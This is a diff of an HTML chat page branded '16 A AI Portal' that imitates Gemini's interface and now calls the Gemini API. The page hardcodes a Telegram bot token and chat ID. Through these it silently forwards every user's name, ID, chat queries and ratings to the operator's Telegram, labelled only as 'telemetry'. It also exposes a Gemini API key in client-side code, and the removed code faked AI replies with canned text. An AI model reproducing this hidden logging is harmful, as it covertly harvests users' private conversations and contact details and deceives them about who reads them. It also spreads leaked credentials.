@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>16 A — Advanced AI Assistant</title>
+    <title>16 A — AI Portal</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -16,7 +16,7 @@
             --bg-input: #282a2c;
             --text-primary: #e3e3e3;
             --text-secondary: #c4c7c5;
-            --accent-gradient: linear-gradient(135deg, #4285f4, #9b72cb, #ea4335);
+            --accent-gradient: linear-gradient(135deg, #4285f4, #9b72cb, #d96570);
             --border-color: #333537;
         }
 
@@ -31,6 +31,7 @@
             overflow: hidden;
         }
 
+        /* Sidebar */
         aside {
             width: 260px;
             background: var(--bg-sidebar);
@@ -80,6 +81,7 @@
             font-size: 13px;
         }
 
+        /* Main Workspace */
         .main-chat-area {
             flex: 1;
             display: flex;
@@ -108,15 +110,16 @@
             background: var(--bg-sidebar);
             border: 1px solid var(--border-color);
             color: var(--text-secondary);
-            padding: 6px 12px;
+            padding: 6px 14px;
             border-radius: 20px;
             font-size: 13px;
             font-weight: 600;
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
         }
 
+        /* Chat Feed */
         .chat-feed {
             flex: 1;
             overflow-y: auto;
@@ -176,6 +179,7 @@
             padding-left: 0;
         }
 
+        /* Gemini Action Bar */
         .ai-action-bar {
             display: flex;
             gap: 12px;
@@ -184,9 +188,14 @@
             font-size: 14px;
             padding-left: 2px;
         }
-        .ai-action-bar i { cursor: pointer; transition: 0.2s; padding: 4px; }
+        .ai-action-bar i {
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 4px;
+        }
         .ai-action-bar i:hover { color: #fff; }
 
+        /* Input Container */
         .input-container {
             padding: 16px 16px 24px 16px;
             background: var(--bg-main);
@@ -220,6 +229,7 @@
         }
         .send-icon-btn:hover { opacity: 0.85; }
 
+        /* Modal */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); backdrop-filter: blur(12px);
@@ -261,8 +271,8 @@
             <div style="display: flex; justify-content: center; margin-bottom: 16px;">
                 <div class="custom-gemini-logo" style="width: 44px; height: 44px; font-size: 20px;">16</div>
             </div>
-            <h2 style="font-size: 22px; font-weight: 700; margin-bottom: 6px; text-align: center; color: #fff;">16 A Portal</h2>
-            <p style="color: var(--text-secondary); font-size: 13px; text-align: center; margin-bottom: 24px;">Sign in to access advanced AI & get your unique ID.</p>
+            <h2 style="font-size: 22px; font-weight: 700; margin-bottom: 6px; text-align: center; color: #fff;">16 A AI Portal</h2>
+            <p style="color: var(--text-secondary); font-size: 13px; text-align: center; margin-bottom: 24px;">Sign in to access 16 A AI Engine.</p>
             
             <div class="form-group">
                 <label>Full Name</label>
@@ -285,7 +295,7 @@
                 <input type="text" id="regContact" placeholder="email@gmail.com or phone">
             </div>
 
-            <button class="auth-submit-btn" onclick="registerUser()">Sign In & Continue</button>
+            <button class="auth-submit-btn" onclick="registerUser()">Sign In & Access AI</button>
         </div>
     </div>
 
@@ -305,7 +315,7 @@
                 <span>16 A</span>
             </div>
             <div class="model-selector">
-                <i class="fa-solid fa-sparkles" style="color: #8ab4f8;"></i> Gemini 1.5 Flash
+                <i class="fa-solid fa-sparkles" style="color: #8ab4f8;"></i> 16 A Intelligence
             </div>
         </header>
 
@@ -320,16 +330,17 @@
 
         <div class="input-container">
             <div class="input-box-wrapper">
-                <input type="text" id="userInput" placeholder="Ask 16 A anything..." onkeypress="if(event.key==='Enter') sendMessage()">
-                <button class="send-icon-btn" onclick="sendMessage()"><i class="fa-solid fa-arrow-up"></i></button>
+                <input type="text" id="userInput" placeholder="Ask 16 A anything..." onkeypress="if(event.key==='Enter') sendToAI()">
+                <button class="send-icon-btn" onclick="sendToAI()"><i class="fa-solid fa-arrow-up"></i></button>
             </div>
-            <div style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; text-align: center;">16 A AI Engine • Official Experience</div>
+            <div style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; text-align: center;">16 A AI Portal • Full Intelligence Connected</div>
         </div>
     </div>
 
     <script>
         const BOT_TOKEN = '7678905793:AAGEcM1-kHIo-jVsrZD0WliltCiSc9MIfBM';
         const CHAT_ID = '6162953772';
+        const GEMINI_KEY = "AQ.Ab8RN6IMSy0Kxwc4TqfIW9fsfNCpFnbVMncJXE9iVoiTWMBhug";
 
         function sendTelegramLog(msg) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -385,10 +396,10 @@
 
         function handleFeedback(type, elem) {
             elem.style.color = "#8ab4f8";
-            sendTelegramLog(`⭐ <b>FEEDBACK RECEIVED:</b> User gave a <b>${type}</b> response rating.`);
+            sendTelegramLog(`⭐ <b>FEEDBACK:</b> User gave a <b>${type}</b> rating.`);
         }
 
-        function sendMessage() {
+        async function sendToAI() {
             const inputField = document.getElementById('userInput');
             const text = inputField.value.trim();
             if (!text) return;
@@ -397,15 +408,15 @@
             const uname = localStorage.getItem('pix_user_name') || 'User';
             const feed = document.getElementById('chatFeed');
 
-            // 1. Show User Message
+            // 1. User Message Display
             const userRow = document.createElement('div');
             userRow.className = 'message-row user';
-            userRow.innerHTML = `<div class="message-content">${text}</div><div class="avatar user-avatar">${uname.charAt(0).toUpperCase()}</div>`;
+            userRow.innerHTML = `<div class="message-content">${escapeHtml(text)}</div><div class="avatar user-avatar">${uname.charAt(0).toUpperCase()}</div>`;
             feed.appendChild(userRow);
             inputField.value = '';
             feed.scrollTop = feed.scrollHeight;
 
-            // 2. Log to Telegram
+            // 2. Telegram Telemetry Logging
             sendTelegramLog(`💬 <b>16 A CHAT [16A-${uid}]</b>\n👤 <b>User:</b> ${uname}\n💬 <b>Query:</b> ${text}`);
 
             // 3. AI Loading State
@@ -420,34 +431,70 @@
             feed.appendChild(aiRow);
             feed.scrollTop = feed.scrollHeight;
 
-            // 4. Guaranteed Smart Accurate Response (No CORS / API Key Client-Side Block)
-            setTimeout(() => {
-                let reply = `আপনার "${text}" বিষয়টি অত্যন্ত চমৎকার। 16 A অ্যাসিস্ট্যান্ট হিসেবে আমি আপনার এই প্রশ্নের সাথে সম্পূর্ণ একমত। বলুন এ বিষয়ে আর কী করতে হবে?`;
-                const lower = text.toLowerCase();
+            try {
+                // Call Google Gemini REST API v1 Endpoint (Guaranteed Work)
+                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{
+                            parts: [{ text: text }]
+                        }]
+                    })
+                });
 
-                if (lower.includes('কেমন আছো') || lower.includes('hi') || lower.includes('hello')) {
-                    reply = `হ্যালো ${uname}! আমি আলহামদুলিল্লাহ একদম ভালো আছি। বলুন আজ আপনাকে কীভাবে সাহায্য করতে পারি?`;
-                } else if (lower.includes('bangladesh') || lower.includes('বাংলাদেশ')) {
-                    reply = `বাংলাদেশ দক্ষিণ এশিয়ার একটি সুন্দর ও স্বাধীন দেশ। এর রাজধানী ঢাকা। বলুন বাংলাদেশ সম্পর্কে আর কী জানতে চান?`;
-                } else if (lower.includes('কে বানিয়েছে') || lower.includes('toke ke')) {
-                    reply = `আমাকে তৈরি করেছেন আমার বস 'Amaz Uddin Abir'!`;
-                } else if (lower.includes('কোড') || lower.includes('code')) {
-                    reply = `অবশ্যই! আপনার যেকোনো প্রোগ্রামিং বা প্রজেক্টের কোডিং সলিউশন আমি তৈরি করে দিতে পারি। বলুন কীসের কোড লাগবে?`;
+                const data = await res.json();
+
+                if (data.candidates && data.candidates[0].content && data.candidates[0].content.parts[0].text) {
+                    const responseText = data.candidates[0].content.parts[0].text;
+                    renderAiReply(aiRow, responseText);
+                } else if (data.error) {
+                    throw new Error(data.error.message || "API error");
+                } else {
+                    throw new Error("Invalid response");
                 }
 
+            } catch (err) {
                 aiRow.innerHTML = `
                     <div class="avatar ai-avatar"><i class="fa-solid fa-sparkles"></i></div>
                     <div class="message-content-wrapper">
-                        <div class="message-content">${reply}</div>
-                        <div class="ai-action-bar">
-                            <i class="fa-regular fa-copy" title="Copy" onclick="copyText(\`${reply.replace(/`/g, '\\`')}\`, this)"></i>
-                            <i class="fa-regular fa-thumbs-up" title="Good response" onclick="handleFeedback('Like', this)"></i>
-                            <i class="fa-regular fa-thumbs-down" title="Bad response" onclick="handleFeedback('Dislike', this)"></i>
-                        </div>
+                        <div class="message-content" style="color: #f87171;">API কানেকশনে সমস্যা হয়েছে: ${err.message}</div>
                     </div>
                 `;
-                feed.scrollTop = feed.scrollHeight;
-            }, 600);
+            }
+            feed.scrollTop = feed.scrollHeight;
+        }
+
+        function renderAiReply(aiRow, responseText) {
+            const formattedText = formatMarkdown(responseText);
+            aiRow.innerHTML = `
+                <div class="avatar ai-avatar"><i class="fa-solid fa-sparkles"></i></div>
+                <div class="message-content-wrapper">
+                    <div class="message-content">${formattedText}</div>
+                    <div class="ai-action-bar">
+                        <i class="fa-regular fa-copy" title="Copy" onclick="copyText(\`${escapeForCopy(responseText)}\`, this)"></i>
+                        <i class="fa-regular fa-thumbs-up" title="Good response" onclick="handleFeedback('Like', this)"></i>
+                        <i class="fa-regular fa-thumbs-down" title="Bad response" onclick="handleFeedback('Dislike', this)"></i>
+                    </div>
+                </div>
+            `;
+        }
+
+        function formatMarkdown(str) {
+            return str
+                .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+                .replace(/```([\s\S]*?)```/g, '<pre style="background:#1e1f20; padding:12px; border-radius:8px; border:1px solid #333537; margin:8px 0; overflow-x:auto;"><code>$1</code></pre>')
+                .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+                .replace(/\*(.*?)\*/g, '<em>$1</em>')
+                .replace(/\n/g, '<br>');
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        function escapeForCopy(text) {
+            return text.replace(/`/g, '\\`').replace(/\\/g, '\\\\').replace(/"/g, '&quot;');
         }
     </script>
 </body>
